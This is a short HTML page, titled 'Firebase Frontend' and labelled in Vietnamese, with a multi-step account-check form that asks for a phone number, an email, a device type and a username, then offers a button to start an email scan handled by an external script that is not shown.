<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Firebase Frontend</title>
    <script type="module" src="index.js"></script>
</head>
<body>
    <h1>Kiểm tra tài khoản</h1>
    
    <label>Nhập số điện thoại:</label>
    <input type="text" id="phone">
    <button onclick="checkPhone()">Xác nhận</button>

    <div id="email-section" style="display: none;">
        <label>Nhập email:</label>
        <input type="text" id="email">
        <button onclick="checkEmail()">Xác nhận</button>
    </div>
    
    <div id="device-section" style="display: none;">
        <label>Chọn thiết bị kết nối:</label>
        <select id="device">
            <option value="mobile">Điện thoại</option>
            <option value="laptop">Laptop</option>
            <option value="tablet">Tablet</option>
            <option value="tv">TV Gia đình</option>
        </select>
        <button onclick="confirmDevice()">Xác nhận</button>
    </div>

    <div id="username-section" style="display: none;">
        <label>Nhập tên người dùng:</label>
        <input type="text" id="username">
        <button onclick="confirmUser()">Xác nhận</button>
    </div>
    
    <div id="scan-section" style="display: none;">
        <p id="scan-message" style="color: red;"></p>
        <button onclick="startScan()">Bắt đầu quét email</button>
    </div>
    <div id="email-container" style="margin-top: 20px;"></div>
</body>
</html>
